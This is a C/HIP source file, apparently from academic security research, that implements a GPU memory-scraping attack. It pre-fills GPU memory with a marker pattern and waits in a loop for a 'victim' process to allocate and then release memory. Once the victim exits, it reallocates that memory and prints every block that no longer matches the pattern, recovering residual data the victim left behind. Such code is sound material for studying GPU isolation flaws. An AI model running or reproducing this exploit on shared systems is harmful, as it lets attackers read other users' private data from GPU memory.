/*
 * Written by Sangho Lee (sangho@gatech.edu)
 */ 

#include <hip/hip_runtime.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>

#define SIZE 2*1024*1024*1024
// 1 GiB
// Tesla has 2687 MiB of Global Memory

void cudasafe(hipError_t error, char *message)
{
	if (error != hipSuccess) 
	{
		fprintf(stderr, "ERROR: %s : %s\n", message, hipGetErrorString(error));
		exit(-1);
	}
}

//const int N = 14;
const int N = 1;

// a 1024-bit random sequence
unsigned int uniq_key[32] = {
        0x63636363U, 0x7c7c7c7cU, 0x77777777U, 0x7b7b7b7bU,
        0xf2f2f2f2U, 0x6b6b6b6bU, 0x6f6f6f6fU, 0xc5c5c5c5U,
        0x30303030U, 0x01010101U, 0x67676767U, 0x2b2b2b2bU,
        0xfefefefeU, 0xd7d7d7d7U, 0xababababU, 0x76767676U,
        0x239c9cbfU, 0x53a4a4f7U, 0xe4727296U, 0x9bc0c05bU,
        0x75b7b7c2U, 0xe1fdfd1cU, 0x3d9393aeU, 0x4c26266aU,
        0x6c36365aU, 0x7e3f3f41U, 0xf5f7f702U, 0x83cccc4fU,
        0x6834345cU, 0x51a5a5f4U, 0xd1e5e534U, 0xf9f1f108U
};

__global__
void foobar(unsigned int *a)
{
	int i = blockIdx.x;
	printf("aaaa\n");
}

int main()
{
	size_t memsize = 2752249856; // best for tesla
	//size_t memsize = 2093219840; // best for kepler

        unsigned int *a;
        a = (unsigned int*)malloc(memsize);
	// 128 B random number
	for (int i = 0; i < memsize/4; i += 32)
	{
		for (int j = 0; j < 32; ++j)
		{
			a[i+j] = uniq_key[j];
		}
	}

        unsigned int *d_a;
        cudasafe(hipMalloc((void**)&d_a, memsize), "hipMalloc");
        cudasafe(hipMemcpy(d_a, a, memsize, hipMemcpyHostToDevice), "hipMemcpy"); // fill GPU memory with a predefined value
	hipFree(d_a); // deallocate it!!

	size_t free_old, free, total;
	hipMemGetInfo(&free_old, &total);
	while (1)
	{
		hipMemGetInfo(&free, &total);

		fprintf(stderr, "Waiting for victim -- Free/Total: %llu/%llu\n", free, total);
	
		if (free_old == free)
		{
			usleep(10*1000);
		}
		else
		{
			fprintf(stderr, "victim comes!!\n");
			break;
		}
	}

//	while (1)
	for (int i = 0; i < 10000; ++i)
	{
		hipMemGetInfo(&free, &total);

		fprintf(stderr, "Waiting for victim's out -- Free/Total: %llu/%llu\n", free, total);
	
		if (free_old != free)
		{
			usleep(10*1000);
		}
		else
		{
			fprintf(stderr, "victim out!!\n");
			break;
		}
	}

	while (hipMalloc((void**)&d_a, memsize) != hipSuccess)
	{
		fprintf(stderr,"%u\n", memsize);
		memsize -= 4;
	}
	fprintf(stderr,"cudaMalloc(): %u\n", memsize);

        cudasafe(hipMemcpy(a, d_a, memsize, hipMemcpyDeviceToHost), "hipMemcpy");
	fprintf(stderr,"cudaMemcpy()\n");

	fprintf(stderr, "Memory dump...\n");

	const int nobytes = 32;

	unsigned int buf[nobytes];

	for (size_t i=0; i < memsize/4; i += nobytes)
	{
		int j;
		for (j=0; j < nobytes; ++j)
		{
			buf[j] = a[i+j];
		}

		for (j=0; j < nobytes; ++j)
		{
			//if (buf[j] != 0x12345678)
			if (buf[j] != uniq_key[j])
				break;
		}

		if (j != nobytes)
		{
			for (int k=0; k < nobytes; ++k)
			{
				printf("%08x\n", buf[k]);
			}
		}
	}

	fprintf(stderr, "Done...\n");

	hipFree(d_a);
	hipDeviceSynchronize();
	hipDeviceReset();

	return EXIT_SUCCESS;
}
